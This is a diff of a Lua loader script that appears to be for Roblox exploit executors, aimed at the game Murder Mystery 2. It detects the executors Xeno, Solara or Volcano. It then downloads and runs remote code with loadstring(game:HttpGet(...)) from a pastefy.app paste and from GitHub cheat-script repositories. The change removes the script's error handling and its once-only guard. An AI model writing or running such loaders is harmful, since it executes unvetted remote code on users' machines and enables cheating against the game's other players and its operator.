@@ -1,28 +1,15 @@
-if not _G.Script3Loaded then
-    _G.Script3Loaded = true  -- Flag so it never runs again
+-- Run Script 3 first (exactly as it is, no error handling)
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/oE8SCnvJ/raw", true))()
+end)
 
-    -- Run Script 3 synchronously
-    local ok, err = pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/oE8SCnvJ/raw", true))()
-    end)
-
-    if not ok then
-        warn("[Loader] Script 3 error:", err)
+-- Original executor-based loader
+local function script()
+    if identifyexecutor and (identifyexecutor() == "Xeno" or identifyexecutor() == "Solara" or identifyexecutor() == "Volcano") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua", true))()
+    else
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/mm2scripthub/TravHub/refs/heads/main/travscript", true))()
     end
 end
 
--- Function to run scripts in parallel safely
-local function run(url)
-    task.spawn(function()
-        local success, e = pcall(function()
-            loadstring(game:HttpGet(url, true))()
-        end)
-        if not success then
-            warn("[Loader] Error in script:", url, e)
-        end
-    end)
-end
-
--- Start Scripts 1 and 2 AFTER Script 3
-run("https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua")
-run("https://raw.githubusercontent.com/mm2scripthub/TravHub/refs/heads/main/travscript")
+task.spawn(script)
